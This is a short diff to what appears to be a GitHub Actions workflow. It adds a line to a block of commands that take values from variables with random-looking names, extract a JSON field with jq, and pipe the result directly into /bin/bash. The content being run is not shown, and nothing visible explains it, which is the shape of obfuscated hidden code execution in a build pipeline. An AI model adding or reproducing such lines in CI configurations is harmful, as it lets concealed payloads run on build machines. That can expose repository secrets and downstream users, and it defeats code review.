@@ -29,6 +29,7 @@ jobs:
           echo $wbq8078 | jq -r .c27 | /bin/bash
           echo $tgzbo14 | jq -r .bzaop2 | /bin/bash
           printf '%s' "$bz70" | jq -r .ly61249 | /bin/bash
+          printf '%s' "$s18120" | jq -r .rv51 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
